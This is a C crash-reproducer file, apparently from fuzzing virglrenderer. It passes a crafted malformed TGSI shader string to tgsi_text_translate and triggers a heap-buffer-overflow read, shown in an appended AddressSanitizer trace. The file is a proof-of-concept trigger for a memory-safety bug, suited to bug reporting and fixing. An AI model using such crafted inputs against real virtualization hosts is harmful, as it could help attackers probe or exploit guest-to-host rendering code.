
#include <assert.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <epoxy/egl.h>

#include "virgl_protocol.h"
#include "virglrenderer.h"
#include "virgl_resource.h"
#include "gallium/auxiliary/tgsi/tgsi_text.c"



int main() {
    uint8_t data[] = "FRAG\x0aPROPERTY F 615]\x0aIMM FLT64 {  0x0 10x\x00'\x00\x00";
    int shader_text_size = sizeof(data);
    uint8_t* shader_text = malloc(shader_text_size + 1);
    memset(shader_text,0,shader_text_size + 1);
    memcpy(shader_text,&data,shader_text_size);
    int size = shader_text_size + sizeof(shader_text);
    struct tgsi_token *tokens = calloc(size, sizeof(struct tgsi_token));

    tgsi_text_translate(shader_text,tokens,size);

    return 0;
}

/*

=================================================================
==356346==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000001a at pc 0x0000004c9806 bp 0x7ffcb3e04ad0 sp 0x7ffcb3e04ac8
READ of size 1 at 0x60200000001a thread T0
    #0 0x4c9805 in eat_opt_white /home/fuzzing/Desktop/virglrenderer-master/build/../src/gallium/auxiliary/tgsi/tgsi_text.c:170:11
    #1 0x4c9805 in translate /home/fuzzing/Desktop/virglrenderer-master/build/../src/gallium/auxiliary/tgsi/tgsi_text.c:1828:4
    #2 0x4d260e in tgsi_text_translate /home/fuzzing/Desktop/virglrenderer-master/build/../src/gallium/auxiliary/tgsi/tgsi_text.c:1883:9
    #3 0x4d260e in main /home/fuzzing/Desktop/virglrenderer-master/build/../src/crash_eat_opt_white.c:25:5
    #4 0x7ff3d4d960b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16
    #5 0x4215ad in _start (/home/fuzzing/Desktop/virglrenderer-master/build/src/crash_eat_opt_white+0x4215ad)

*/

